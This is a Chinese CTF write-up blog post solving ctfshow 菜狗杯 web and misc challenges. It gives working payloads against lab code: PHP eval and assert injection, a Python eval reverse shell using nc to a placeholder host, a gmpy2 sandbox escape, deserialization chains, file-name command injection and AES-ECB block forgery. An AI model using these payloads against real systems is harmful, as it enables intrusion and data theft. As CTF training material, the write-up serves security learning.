---
title: ctfshow_菜狗杯
author: Creexile
date: 2024-06-28
lastMod: 2024-07-05
summary: '一个半小时是三个半小时,三个半小时是210分钟'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [PHP, 反序列化, Python, 二维码, 隐写, 代码审计, CTF]
---

# Web

---

## Web签到

嵌套: Cookie传参 -> POST传参 -> GET传参 -> REQUEST传参 -> eval执行

假如Cookie中传入`CTFshow-QQ群:=a`, 那么就会出现`$_POST['a']`, 假如POST传入的值为a=b，那么就会得到`$_GET['b']`，接着假如GET传入b=c就会得到`$_REQUEST['c']`

假如再get传入c=123那么前面这一部分`($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]])`的值就是123了。但是最终是需要通过数组下标的方式给到eval的。所以c传个数组就可以了: `c[6][0][7][5][8][0][9][4][4]=system('ls');`

接下来命令执行就不多说了, 如果发不出去就用url编码一下

```
payload:
GET: ?b=c&c[6][0][7][5][8][0][9][4][4]=system('cat%20%2ff1agaaa');
POST: a=b
Cookie: CTFshow-QQ%e7%be%a4:=a
```

![image-20240623205506489](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623205506489.png)

## 我的眼里只有\$

```php
<?php
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-11-10 17:20:38
# @Last Modified by:   h1xa
# @Last Modified time: 2022-11-11 08:21:54
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
error_reporting(0);
extract($_POST);
eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);  // 36个$
highlight_file(__FILE__);
```

本题就是如何闭合这36个\$, 生成payload的exp如下

```python
my_str = '_'
for i in range(26):
    my_str += '=' + chr(97+i)+'&' + chr(97+i)
for i in range(9):
    my_str += '=' + chr(65+i)+'&' + chr(65+i)
my_str += "=system('ls /')"
print(my_str)
# _=a&a=b&b=c&c=d&d=e&e=f&f=g&g=h&h=i&i=j&j=k&k=l&l=m&m=n&n=o&o=p&p=q&q=r&r=s&s=t&t=u&u=v&v=w&w=x&x=y&y=z&z=A&A=B&B=C&C=D&D=E&E=F&F=G&G=H&H=I&I=system('ls /');
```

命令执行就不再赘述

![image-20240623212128207](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623212128207.png)

## 抽老婆

本来想应该是通过伪造图片的请求来读取文件的, 发现不行

最后在源码这里找到下载方式, 这个下载方式和旁边的注释很可疑, 可能会有任意文件下载

```html
<a
  class="layui-btn layui-btn-lg layui-btn-radius layui-btn-normal"
  href="/download?file=6249ab7d7d4f7993619c2a22cb426d03.jpg"
  style="width: 200px;"
  >下载老婆</a
>
<!-- 特意为了不会右键另存为的同学做了这个功能，我真的太温柔了 -->
```

利用`/download?file=1111`报错,可以发现是Flask框架, 配置文件在app.py, ``/download?file=../../app.py`下载源码

```python
# !/usr/bin/env python
# -*-coding:utf-8 -*-

"""
# File       : app.py
# Time       ：2022/11/07 09:16
# Author     ：g4_simon
# version    ：python 3.9.7
# Description：抽老婆，哇偶~
"""

from flask import *
import os
import random
from flag import flag

#初始化全局变量
app = Flask(__name__)
app.config['SECRET_KEY'] = 'tanji_is_A_boy_Yooooooooooooooooooooo!'

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/getwifi', methods=['GET'])
def getwifi():
    session['isadmin']=False
    wifi=random.choice(os.listdir('static/img'))
    session['current_wifi']=wifi
    return render_template('getwifi.html',wifi=wifi)

@app.route('/download', methods=['GET'])
def source():
    filename=request.args.get('file')
    if 'flag' in filename:
        return jsonify({"msg":"你想干什么？"})
    else:
        return send_file('static/img/'+filename,as_attachment=True)

@app.route('/secret_path_U_never_know',methods=['GET'])
def getflag():
    if session['isadmin']:
        return jsonify({"msg":flag})
    else:
        return jsonify({"msg":"你怎么知道这个路径的？不过还好我有身份验证"})

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80,debug=True)

```

`/secret_path_U_never_know`路由有一个session验证, 直接用上得到的密钥和flasksession伪造工具即可伪造`isadmin=True`,发包即可拿到flag

![image-20240623224307361](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240623224307361.png)

## 一言既出

```php
<?php
highlight_file(__FILE__);
include "flag.php";
if (isset($_GET['num'])){
    if ($_GET['num'] == 114514){
        assert("intval($_GET[num])==1919810") or die("一言既出，驷马难追!");
        echo $flag;
    }
}
```

1. 先满足`$_GET['num']`的值等于114514
2. 使用`assert()`函数判断给定的表达式是否为真。如果表达式为假，则会抛出一个致命错误。
3. 表达式为`intval($_GET[num])==1919810`，即将`$_GET['num']`强制转换为整数后，判断是否等于1919810, 如果表达式为真，则程序继续执行。

有好几种解:
num=114514进入条件后, 通过 # 注释掉后面的部分

```
?num=114514);%23

# 再给一点类似原理的:
?num=114514);//
?num=114514);(19199810	# 闭合后给后面的判断也变为真
?num=114514)==1 or system('ls');%23	# 恒等于1后用or注入其他命令
?num=114514)==1%20or%20system(%27ls%27);%23
```

num=114514进入条件然后加上一个数, 使得num变为1919810

```
?num=114514%2b1805296
?num=114514)==1 or system('ls') or (1919810
```

> URL中的+和空格 +如果直接写在url里面, 只会被当成一个字符串输出, 而不是作为运算符号, 所以用%2b
> 空格则表示单词之间的间隔
> 另外, 单引号: %27 , 井号: %23

## Webshell

```php
<?php
    error_reporting(0);

    class Webshell {
        public $cmd = 'echo "Hello World!"';

        public function __construct() {
            $this->init();
        }

        public function init() {
            if (!preg_match('/flag/i', $this->cmd)) {
                $this->exec($this->cmd);
            }
        }

        public function exec($cmd) {
            $result = shell_exec($cmd);
            echo $result;
        }
    }

    if(isset($_GET['cmd'])) {
        $serializecmd = $_GET['cmd'];
        $unserializecmd = unserialize($serializecmd);
        $unserializecmd->init();
    }
    else {
        highlight_file(__FILE__);
    }

?>
```

非常简单的反序列化, 直接修改cmd的值就行, 完全没有什么难度, 至于这么提取flag, 通配符会出手:

```php
<?php
    error_reporting(0);
    highlight_file(__FILE__);
    class Webshell {
        public $cmd = 'ls';	// 修改这里就可以了, cat fl*
    }

    $a = new Webshell();
    echo serialize($a);
?>
```

也可以将该目录下所有文件内容输出到一个不含flag的文件

```
O:8:"Webshell":1:{s:3:"cmd";s:7:"cat fl*";}	# 然后看F12
O:8:"Webshell":1:{s:3:"cmd";s:13:"cat * > 1.txt";}	# 后面再读取1.txt就可以了
```

## 化零为整

```php
<?php

highlight_file(__FILE__);
include "flag.php";

$result='';

for ($i=1;$i<=count($_GET);$i++){
    if (strlen($_GET[$i])>1){
        die("你太长了！！");
        }
    else{
    $result=$result.$_GET[$i];
    }
}

if ($result ==="大牛"){
    echo $flag;
}
```

我还在想url编码后不是三个嘛, 结果发现是拼接, 变量是一位就行, 而本身url编码后也只是占了一个位置, **不是三个**

```
payload:
?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B
```

## 无一幸免

```php
<?php
include "flag.php";
highlight_file(__FILE__);

if (isset($_GET['0'])){
    $arr[$_GET['0']]=1;
    if ($arr[]=1){
        die($flag);
    }
    else{
        die("nonono!");
    }
}
```

非预期:

```
传入 ?0=1
```

看了WP, 这肯定不对的啊? 哦有个fixed

```php
<?php
include "flag.php";
highlight_file(__FILE__);

if (isset($_GET['0'])){
    $arr[$_GET['0']]=1;
    if ($arr[]=1){
        die("nonono!");
    }
    else{
        die($flag);
    }
}
```

现在正常了, 只能用数组整型溢出绕过永真判断, 其他的数值可以看下面的`茶歇区`

```
payload:
?0=9223372036854775807	# 反正大就是好
```

## 算力超群

`python eval`

计算是后台计算的, 并不能干别的, 但是GET传值, 可以尝试构建错误的传值和错误的页面, 没有渲染就自己构建get请求重新访问

![image-20240626201236473](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240626201236473.png)

在报错页面底下有`/app/app.py`部分源码(所以是Flask框架), 其中的a和b结合GET传值可以确定是可以控制的, 看上去没有过滤, 传值尝试后发现number1是有过滤的, 而number2是没有过滤的, 尝试用number2进行命令执行

> 所以为什么hint: 算算算算算算, 我是铁算子r4

因为eval是不回回显的, 所以我尝试用反弹Shell进行后续步骤, 当然也可以把执行的结果塞进文件然后读取

```
payload:
?number2=1,__import__('os').system('nc ip port -e /bin/sh')
```

我这里尝试直接发包, 发现连接不了, 还是直接访问才行; 然后在根目录找到flag

另一种方法

```
# 展示文件目录
_calculate?number1=1&operator=%2B&number2=2,__import__('os').system('ls / >/app/templates/hint.html')
# 访问 http://7125305f-e54e-406f-91cd-3c92b19e4813.challenge.ctf.show/hint 得到文件目录

# 读取flag
_calculate?number1=1&operator=%2B&number2=2,__import__('os').system('cat /flag >/app/templates/hint.html')
# 再次访问hint即可
```

附上wp给的源码:

```python
# -*- coding: utf-8 -*-
# @Time    : 2022/11/2
# @Author  : 探姬
# @Forkfrom:https://github.com/helloflask/calculator

import re
from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

@app.route('/_calculate')
def calculate():
    a = request.args.get('number1', '0')
    operator = request.args.get('operator', '+')
    b = request.args.get('number2', '0')

    m = re.match(r'^\-?\d*[.]?\d*$', a)
    n = re.match(r'^\-?\d*[.]?\d*$', a)

    if m is None or n is None or operator not in '+-*/':
        return jsonify(result='Error!')

    if operator == '/':
        result = eval(a + operator + str(float(b)))
    else:
        result = eval(a + operator + b)
    return jsonify(result=result)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/hint')
def hint():
    return render_template('hint.html')

if __name__ == '__main__':
    app.run()

```

## 算力升级

`gmpy2.__builtins__的命令执行`, 嗯, 我觉得比较像模板注入? [PyJail](https://blog.csdn.net/Jayjay___/article/details/132436072)

提示是: 输入算式即可让R4帮你进行计算，本次R4重装升级，已经支持gmpy2了，可以使用gmpy2的函数进行计算，那我们赶快开始吧！

现在换成了POST, 但是源码直接给到了(上面的标签)

```python
# !/usr/bin/env python
# -*-coding:utf-8 -*-
"""
# File       : app.py
# Time       ：2022/10/20 15:16
# Author     ：g4_simon
# version    ：python 3.9.7
# Description：算力升级--这其实是一个pyjail题目
"""
from flask import *
import os
import re,gmpy2
import json
#初始化全局变量
app = Flask(__name__)
pattern=re.compile(r'\w+')

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/tiesuanzi', methods=['POST'])
def tiesuanzi():
    code=request.form.get('code')
    for item in pattern.findall(code):#从code里把单词拿出来
        if not re.match(r'\d+$',item):#如果不是数字
            if item not in dir(gmpy2):#逐个和gmpy2库里的函数名比较
               return jsonify({"result":1,"msg":f"你想干什么？{item}不是有效的函数"})
    try:
        result=eval(code)
        return jsonify({"result":0,"msg":f"计算成功，答案是{result}"})
    except:
        return jsonify({"result":1,"msg":f"没有执行成功，请检查你的输入。"})

@app.route('/source', methods=['GET'])
def source():
    return render_template('source.html')
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80,debug=False)
```

源码对于输入的限制是两个正则，要求要么是数字，要么是dir(gmpy2)中的内容. 直接利用本地的py环境进行测试

```python
import gmpy2
print(dir(gmpy2))
# print(gmpy2.__builtins__)	# 发现这里面有eval可以进行命令执行
```

发现`gmpy2.__builtins__`是含有`eval`函数的, 思路就是使用`eval`和`dir(gmpy2)`中的内容拼接字符串, 执行以下命令

```python
gmpy2.__builtins__['eval']("__import__('os').popen('tac /flag').read()")	# 反正是能执行到就行
```

只允许`gmpy2`库中的函数, 我们不能直接用`eval`, 那就间接用可用函数构造出`eval`. 这里使用字符串下标操作: `'erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]==='eval'`

`'erf'[0]` 会得到字符串 `erf` 的第一个字符，即 `e`
`'div'[2]` 会得到字符串 `div` 的第三个字符，即 `v`

不想手动就使用脚本:

```python
import gmpy2

s="__import__('os').popen('tac /flag').read()"
payload="gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]("	# eval已经创建好了

# 代码会在gmpy2的函数名中寻找包含这个字符的最短的函数名，并记录下这个字符在函数名中的位置。然后，这个函数名和字符的位置会被添加到payload字符串中, 特殊字符则直接加入payload
for i in s:
    if i not in "/'(). ":
        temp_index=0
        temp_string='x'*20
        for j in dir(gmpy2):
            if j.find(i)>=0:
                if len(j)<len(temp_string):
                    temp_string=j
                    temp_index=j.find(i)
        payload+=f'\'{temp_string}\'[{temp_index}]+'
    else:
        payload+=f'\"{i}\"+'

payload=payload[:-1]+')'
print(payload)
```

Payload:

```
gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cot'[2]+'ai'[0]+'cmp'[0]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
```

直接输入框就行, 我很好奇为什么我bp发出去不行

## easyPytHon_P

源码糊脸

```python
from flask import request
cmd: str = request.form.get('cmd')
param: str = request.form.get('param')
# ------------------------------------- Don't modify ↑ them ↑! But you can write your code ↓
import subprocess, os
if cmd is not None and param is not None:
    try:
        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)
        print('Done!')
    except subprocess.TimeoutExpired:
        print('Timeout!')
    except:
        print('Error!')
else:
    print('No Flag!')
```

关键在于`tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)`

```
subprocess.run: 第一个参数是执行命令
cmd[:3]: 只取cmd这个字符串的前三个字符
__file__: 当前文件路径
cwd=os.getcwd(): 设置子进程的当前目录
```

[对于subprocess.run的详细介绍](https://www.cnblogs.com/ccorz/p/Python-subprocess-zhong-derun-fang-fa.html)

传参是POST, 通过Flask的`request.form.get()`方法, 从表单数据中获取'cmd'和'param'的值, 这通常是在POST请求中使用的

```
cmd=ls&param=./		# param不能是空的, 否则执行不出来
cmd=cat&param=flag.txt
```

## 遍地飘零

`$$值覆盖，$_GET全局变量和本地变量`

```php
<?php
include "flag.php";
highlight_file(__FILE__);

$zeros="000000000000000000000000000000";

foreach($_GET as $key => $value){
    $$key=$$value;
}

if ($flag=="000000000000000000000000000000"){
    echo "好多零";
}else{
    echo "没有零，仔细看看输入有什么问题吧";
    var_dump($_GET);
}
```

后台在接收到GET请求传递过来的参数后，会遍历GET的参数并且赋给`$key`, 再将`$key`对应的值给`$value`; 同时会将GET请求传递的变量名和变量值都作为本地变量的变量名，然后进行值的覆盖, 最后使用`var_dump`函数输出`$_GET`的值

如果`$_GET`不是本地变量的话，后台会输出GET请求传递过去的参数, 因此`$_GET`必须是本地变量, 也就是GET请求传递的参数; 同时, 还需要参数值为flag, 才能进行变量覆盖

payload:

```
?_GET=flag
```

## 茶歇区

正常游戏是无法得到flag的, 源代码审计也没有任何的头绪, 购买只能输入整数, 就先猜测是整形溢出吧

```
# 常见的数据类型的取值范围
uint8 -> 0-255
uint16 -> 0-65535
uint32 -> 0-4294967295
uint36 -> 0-18446744073709551615
int8 -> -127-128
int16 -> -32768-32767
int32 -> -2147483648-2147483647
int64 -> -9223372036854775808-9223372036854775807
```

随便塞一个非常大的数字进去, 可以得到回显, 你会发现这个数字是固定的`9223372036854775807`, 看来是int64了; 但是尝试了挺多次, 都发现就算数字大于int64的极限, 它仍然不计分; 尝试比最大值小一点

```
原来: 9223372036854775807
现在: 922337203685477580		# 也不行
再来: 999999999999999999		# 可以了
```

虽然可以, 但是为什么分是倒扣的?再发一遍就可以了, 弹窗处获得flag

## 小舔田?

反序列化是一个非常好的东西

```php
<?php
include "flag.php";
highlight_file(__FILE__);

class Moon{
    public $name="月亮";
    public function __toString(){
        return $this->name;
    }

    public function __wakeup(){
        echo "我是".$this->name."快来赏我";
    }
}

class Ion_Fan_Princess{
    public $nickname="牛夫人";

    public function call(){
        global $flag;
        if ($this->nickname=="小甜甜"){
            echo $flag;
        }else{
            echo "以前陪我看月亮的时候，叫人家小甜甜！现在新人胜旧人，叫人家".$this->nickname."。\n";
            echo "你以为我这么辛苦来这里真的是为了这条臭牛吗?是为了你这个没良心的臭猴子啊!\n";
        }
    }

    public function __toString(){
        $this->call();
        return "\t\t\t\t\t\t\t\t\t\t----".$this->nickname;
    }
}

if (isset($_GET['code'])){
    unserialize($_GET['code']);

}else{
    $a=new Ion_Fan_Princess();
    echo $a;
}
```

最终目的肯定是`Ion_Fan_Princess`类中的`echo $flag;`, 而它在`call()`中, 找到调用的地方, 显然是本类中的`__toString`方法;

那么想要调用这里的`__tostring`函数，可以利用上面`Moon`类中的`__toString`方法，使得`$this->name`的值为`Ion_Fan_Princess`对象, 在`wakeup`方法中触发`__toString`方法

看的头晕可以给你画个图:

![image-20240627172813673](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627172813673.png)

```php
<?php
    class Moon{
        public $name;
    }

    class Ion_Fan_Princess{
        public $nickname="小甜甜";
    }
    $a=new Moon();
    $a->name=new Ion_Fan_Princess();
    echo serialize($a);
?>
# O:4:"Moon":1:{s:4:"name";O:16:"Ion_Fan_Princess":1:{s:8:"nickname";s:9:"小甜甜";}}
```

payload:

```
?code=O:4:"Moon":1:{s:4:"name";O:16:"Ion_Fan_Princess":1:{s:8:"nickname";s:9:"小甜甜";}}
```

## LSB探姬

```python
# !/usr/bin/env python
# -*-coding:utf-8 -*-
"""
# File       : app.py
# Time       ：2022/10/20 15:16
# Author     ：g4_simon
# version    ：python 3.9.7
# Description：TSTEG-WEB
# flag is in /app/flag.py
"""
from flask import *
import os
#初始化全局变量
app = Flask(__name__)
@app.route('/', methods=['GET'])
def index():
    return render_template('upload.html')
@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        try:
            f = request.files['file']
            f.save('upload/'+f.filename)
            cmd="python3 tsteg.py upload/"+f.filename
            result=os.popen(cmd).read()
            data={"code":0,"cmd":cmd,"result":result,"message":"file uploaded!"}
            return jsonify(data)
        except:
            data={"code":1,"message":"file upload error!"}
            return jsonify(data)
    else:
        return render_template('upload.html')
@app.route('/source', methods=['GET'])
def show_source():
    return render_template('source.html')
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80,debug=False)
```

首先可以得到`flag is in /app/flag.py`, 然后发现`cmd="python3 tsteg.py upload/"+f.filename`没有过滤,没有限制,可能会出现和命令注入攻击

> 如果用户上传的文件名包含恶意的路径信息(例如 ../../etc/passwd), 那么这个代码就会尝试在一个用户不应该有权限访问的路径下运行 tsteg.py 脚本. 这就是所谓的路径遍历攻击, 攻击者通过这种方式可以访问到他们本不应该能够访问的文件.
>
> 如果 f.filename 中包含了特殊字符(如分号或反引号), 那么攻击者可能可以在 tsteg.py 脚本执行完之后, 再执行一些恶意的命令, 这就是所谓的路径遍历攻击

所以只需要在上传文件的地方加上分号再续上命令就好了, poc如下

```
1.jpg;ls;cat flag.py
```

![image-20240627183205759](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627183205759.png)

## Is_Not_Obfuscate

你可以在源码里面找到一些提示:

```html
<!-- //测试执行加密后的插件代码 
	   //这里只能执行加密代码，非加密代码不能执行
	  eval(decode($_GET['input'])); -->

<!-- <button name="action" value="test"> 执行 (do)</button>-->

<!-- Test the lib.php before use the index.php！-->
<!-- After that,delete the robots.txt！-->
```

访问robots.txt可以得到两个敏感路径:`/lib.php?flag=0`和`/plugins`; 访问`/lib.php?flag=1`可以得到一串类似base64的密文, 将这行密文复制到输入框; 另外上面注释不是注释掉了一个按钮嘛, 你给他变回来, 操作如下:

![image-20240627190324419](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240627190324419.png)

可以得到解密后的源码:

```php
<?php
header("Content-Type:text/html;charset=utf-8");
include 'lib.php';
if(!is_dir('./plugins/')){
    @mkdir('./plugins/', 0777);
}
//Test it and delete it ！！！
//测试执行加密后的插件代码
if($_GET['action'] === 'test') {
    echo 'Anything is good?Please test it.';
    @eval(decode($_GET['input']));
}

ini_set('open_basedir', './plugins/');
if(!empty($_GET['action'])){
    switch ($_GET['action']){
        case 'pull':
            $output = @eval(decode(file_get_contents('./plugins/'.$_GET['input'])));
            echo "pull success";
            break;
        case 'push':
            $input = file_put_contents('./plugins/'.md5($_GET['output'].'youyou'), encode($_GET['output']));
            echo "push success";
            break;
        default:
            die('hacker!');
    }
}

?>
```

通过审阅源码可知, action的值有三个: test, pull, push

```
test：测试用
push：插件内容写入文件
pull：读取文件，解密命令并执行
```

由于`md5($_GET['output'].'youyou'`,说明加密的盐值为youyou

假如我们传入`output=phpinfo()&action=push`, 则会生成一个文件, 路径为`plugins/md5值`该md5值是可以本地计算得到的, 就是我们代码后面拼接youyou后的md5值;
然后如果在传入`action=pull&input=刚才生成的文件路径`就可以运行刚才的代码了。

因此，构造读取目录的Payload如下

```
# 加密, 你问我变量怎么来的?抓包来的
?input=&action=push&output=<?php echo `ls /`;?>
# 解密和执行
?input=e31d7b1dfe43749c42490c26deca67a6&action=pull&output=
```

执行就可以得到文件目录,继续构造

```
# payload
?input=&action=push&output=<?php echo `cat /f1agaaa`;?>
?input=aa47b964e675ae576fa5a3a266afb74f&action=pull&output=
```

## 龙珠NFT

源码如下:

```python
# !/usr/bin/env python
# -*-coding:utf-8 -*-
"""
# File       : app.py
# Time       ：2022/10/20 15:16
# Author     ：g4_simon
# version    ：python 3.9.7
# Description：DragonBall Radar (BlockChain)
"""
import hashlib
from flask import *
import os
import json
import hashlib
from Crypto.Cipher import AES
import random
import time
import base64
#网上找的AES加密代码，加密我又不懂，加就完事儿了
class AESCipher():
    def __init__(self,key):
        self.key = self.add_16(hashlib.md5(key.encode()).hexdigest()[:16])
        self.model = AES.MODE_ECB
        self.aes = AES.new(self.key,self.model)
    def add_16(self,par):
        if type(par) == str:
            par = par.encode()
        while len(par) % 16 != 0:
            par += b'\x00'
        return par
    def aesencrypt(self,text):
        text = self.add_16(text)
        self.encrypt_text = self.aes.encrypt(text)
        return self.encrypt_text
    def aesdecrypt(self,text):
        self.decrypt_text = self.aes.decrypt(text)
        self.decrypt_text = self.decrypt_text.strip(b"\x00")
        return self.decrypt_text
#初始化全局变量
app = Flask(__name__)
flag=os.getenv('FLAG')
AES_ECB=AESCipher(flag)
app.config['JSON_AS_ASCII'] = False
#懒得弄数据库或者类，直接弄字典就完事儿了
players={}
@app.route('/', methods=['GET'])
def index():
    """
    提供登录功能
    """
@app.route('/radar',methods=['GET','POST'])
def radar():
   """
   提供雷达界面
   """
@app.route('/find_dragonball',methods=['GET','POST'])
def  find_dragonball():
    """
    找龙珠，返回龙珠地址
    """
    xxxxxxxxxxx#无用代码可以忽略
    if search_count==10:#第一次搜寻，给一个一星龙珠
        dragonball="1"
    elif search_count<=0:
        data={"code":1,"msg":"搜寻次数已用完"}
        return jsonify(data)
    else:
        random_num=random.randint(1,1000)
        if random_num<=6:
            dragonball=一个没拿过的球，比如'6'
        else:
            dragonball='0'#0就代表没有发现龙珠
    players[player_id]['search_count']=search_count-1
    data={'player_id':player_id,'dragonball':dragonball,'round_no':str(11-search_count),'time':time.strftime('%Y-%m-%d %H:%M:%S')}
    #json.dumps(data)='{"player_id": "572d4e421e5e6b9bc11d815e8a027112", "dragonball": "1", "round_no": "9", "time":"2022-10-19 15:06:45"}'
    data['address']= base64.b64encode(AES_ECB.aesencrypt(json.dumps(data))).decode()
    return jsonify(data)
@app.route('/get_dragonball',methods=['GET','POST'])
def get_dragonball():
    """
    根据龙珠地址解密后添加到用户信息
    """
    xxxxxxxxx#无用代码可以忽略
    try:
        player_id=request.cookies.get("player_id")
        address=request.args.get('address')
        data=AES_ECB.aesdecrypt(base64.b64decode(address))
        data=json.loads(data.decode())
        if data['dragonball'] !="0":
            players[data['player_id']]['dragonballs'].append(data['dragonball'])
            return jsonify({'get_ball':data['dragonball']})
        else:
            return jsonify({'code':1,'msg':"这个地址没有发现龙珠"})
    except:
        return jsonify({'code':1,'msg':"你干啥???????"})
@app.route('/flag',methods=['GET','POST'])
def get_flag():
    """
    查看龙珠库存
    """
    #如果有7颗龙珠就拿到flag~
@app.route('/source',methods=['GET','POST'])
def get_source():
    """
    查看源代码
    """
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80,debug=False)
```

根据源码可知, 一共有5个路由:

1. `/`提供注册功能, 将用户名的md5作为session存入
2. `/radar`没用
3. `/find_dragonball`如果是第一次访问, 那么dragonball就是固定值1, 否则访问后产生一个随机数范围是1-1000; 如果是在0-6之间, 那么就把dragonball赋值为该数，否则就赋值为0; 并且每个用户都是只有十次机会
4. `get_dragonball`传入一个address，如果解密后的值中dragonball不为0，那么就会获得该星的龙珠
5. `flag`有1-7号的dragonball就拿到flag

即使你想用暴力破解的方式, 问题是代码限制永远不可能获得数字7, 唯一可能有问题的地方就是加密方法了, 利用加密方法伪造地址获得龙珠

address是用AES的ECB模式加密的，稍微查一下就可以知道，ECB模式一组密文对应一组明文，也
就是说，可以通过改变密文的顺序从而改变解密后明文的顺序; 代码中用的是以16位为一组进行分割,不足16位则用\x00补齐

![image-20230901113556970](https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/925d2af71d650be1ff09e9b5e22fcfae.png)

利用源码中给的例子进行划分: 用户不变的前提下,前四行是固定的; 如果我们删除第五行, 刚好`dragonball`就会变成`round_no`的9, 而只要`dragonball`不为0我们就能获得龙珠; 这个次数又是我们可以控制的, 也就可以控制生成的龙珠数了

```
{"player_id": "5
72d4e421e5e6b9bc
11d815e8a027112"
, "dragonball":
"1", "round_no":	# 到时候这行没了
 "9", "time":"2
 022-10-19 15:06
 :45"}
```

脚本如下:

```python
import requests
import json
import base64
import random

url = 'https://37f2b8fd-efbc-45e6-b33b-9eb1392146c7.challenge.ctf.show/'

s = requests.session()
username = str(random.randint(1, 100000))
print(username)
r = s.get(url + '?username=' + username)  # 创建随机用户名

# 循环10次向服务器发送请求以获取龙珠信息, 将响应解析后存储在 responses 列表
responses = []
for i in range(10):
    r = s.get(url + 'find_dragonball')
    responses.append(json.loads(r.text))

# 代码遍历列表, 提取出 player_id, dragonball, round_no 和 time, 并将 address 进行Base64解码。然后检查 round_no
# 是否在1到7之间，如果是，则通过删除解码后的地址中的某些部分伪造一个新的地址 fake_address, 并重新编码; 最后, 使用伪造的地址向服务器发送请求以获取龙珠
for item in responses:
    data = json.dumps({'player_id': item['player_id'], 'dragonball': item['dragonball'], 'round_no': item['round_no'],
                       'time': item['time']})
    miwen = base64.b64decode(item['address'])
    round_no = item['round_no']
    if round_no in [str(i) for i in range(1, 8)]:
        fake_address = miwen[:64] + miwen[80:]
        fake_address = base64.b64encode(fake_address).decode()
        r = s.get(url + 'get_dragonball', params={"address": fake_address})

r = s.get(url + 'flag')
print(r.text)

```

# Misc

---

## 谜之栅栏

下载下来两个文件都无法用stegdetect打开, 但是用图片打开还是有不同的,于是就想在16进制里面找

用010 Editor的比较文件(Ctrl+M)工具可以寻找两个文件中的不同之处然后拼接
`cfhwfaab2cb4af5a5820}`和`tso{06071f997b5bdd1a`
既然叫做栅栏,就试试栅栏密码解密, 分为两栏的时候得到解密结果

## 你会数数吗

用010 Editor打开此文件,数数多半意味着字数统计

找到直方图(Ctrl+Shift+T), 然后按照百分比排序就可以看到flag

## 你会异或吗

题目给了数字0x50, 因为异或可逆的特性, 只需要再次异或就可以变回来

用010 Editor打开此文件, 文件内没有有效字符串也没有其他东西, 猜测是将整个文件异或

工具-> 十六进制运算-> 二进制异或-> 操作数50(十六进制), 就可以看到是正常的PNG头, 保存修改拿到flag

## flag一分为二

尝试了图片宽高爆破, 在图片底下得到后半部分flag

> 被修改过的图片 Honeyview 都不能正常显示

LSB没有, 不包含压缩包, 然后尝试盲水印, 可以得到前半部分flag

[watermark](https://www.mefcl.com/watermark/5821)

## 我是谁?

不会写脚本就是一个纯纯费眼睛的玩意, 很难想象出题人经历了什么有如此的精神状态

```python
import requests
from lxml import html
import cv2
import numpy as np
import json


url="https://be63e113-bfc8-4d2f-85a8-ff939464fa05.challenge.ctf.show/"

sess=requests.session()

all_girl=sess.get(url+'/static/all_girl.png').content

with open('all_girl.png','wb')as f:
        f.write(all_girl)

big_pic=cv2.imdecode(np.fromfile('all_girl.png', dtype=np.uint8), cv2.IMREAD_UNCHANGED)
big_pic=big_pic[50:,50:,:]
image_alpha = big_pic[:, :, 3]
mask_img=np.zeros((big_pic.shape[0],big_pic.shape[1]), np.uint8)
mask_img[np.where(image_alpha == 0)] = 255

cv2.imwrite('big.png',mask_img)



def answer_one(sess):
        #获取视频文件
        response=sess.get(url+'/check')
        if 'ctfshow{' in response.text:
                print(response.text)
                exit(0)
        tree=html.fromstring(response.text)
        element=tree.xpath('//source[@id="vsource"]')
        video_path=element[0].get('src')
        video_bin=sess.get(url+video_path).content
        with open('Question.mp4','wb')as f:
                f.write(video_bin)
        #获取有效帧
        video = cv2.VideoCapture('Question.mp4')
        frame=0
        while frame<=55:
                res, image = video.read()
                frame+=1
        #cv2.imwrite('temp.png',image)
        video.release()
        #获取剪影
        image=image[100:400,250:500]
        gray_image=cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
        #cv2.imwrite('gray_image.png',gray_image)
        temp = np.zeros((300, 250), np.uint8)
        temp[np.where(gray_image>=128)]=255
        #去白边
        temp = temp[[not np.all(temp[i] == 255) for i in range(temp.shape[0])], :]
        temp = temp[:, [not np.all(temp[:, i] == 255) for i in range(temp.shape[1])]]
        #缩放至合适大小，肉眼大致判断是1.2倍，不一定准
        temp = cv2.resize(temp,None,fx=1.2,fy=1.2)
        #查找位置
